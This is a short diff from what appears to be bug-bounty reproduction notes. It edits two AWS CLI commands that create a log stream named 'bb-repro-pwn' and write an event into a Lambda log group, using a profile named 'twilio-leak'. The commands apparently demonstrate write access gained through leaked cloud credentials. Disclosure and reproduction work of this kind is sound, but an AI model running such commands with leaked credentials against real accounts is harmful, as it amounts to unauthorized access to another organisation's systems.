@@ -10,11 +10,11 @@
 # --probe); if you run it, the results are yours and should be reported as yours.
 
 $ aws logs create-log-stream \
-    --log-group-name "/aws/lambda/ZBe35605a7…" \
+    --log-group-name "/aws/lambda/ZBeaf0U42…" \
     --log-stream-name "bb-repro-pwn" --region us-east-1 --profile twilio-leak
 
 $ aws logs put-log-events \
-    --log-group-name "/aws/lambda/ZBe35605a7…" \
+    --log-group-name "/aws/lambda/ZBeaf0U42…" \
     --log-stream-name "bb-repro-pwn" \
     --log-events '[{"timestamp": 1748…, "message": "…used externally…"}]' \
     --region us-east-1 --profile twilio-leak
